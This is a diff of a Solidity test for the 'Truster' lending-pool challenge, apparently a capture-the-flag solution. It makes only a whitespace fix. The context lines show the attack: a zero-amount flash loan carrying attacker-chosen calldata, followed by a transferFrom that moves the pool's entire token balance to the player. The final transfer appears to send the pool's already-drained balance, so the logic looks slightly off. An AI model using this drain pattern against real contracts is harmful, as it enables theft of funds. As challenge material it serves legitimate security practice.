@@ -57,7 +57,7 @@ contract TrusterChallenge is Test {
 
         pool.flashLoan(0, address(this), address(token), data);
         token.transferFrom(address(pool), player, token.balanceOf(address(pool)));
-        token.transfer(recovery,token.balanceOf(address(pool)));
+        token.transfer(recovery, token.balanceOf(address(pool)));
         // done
         
     }
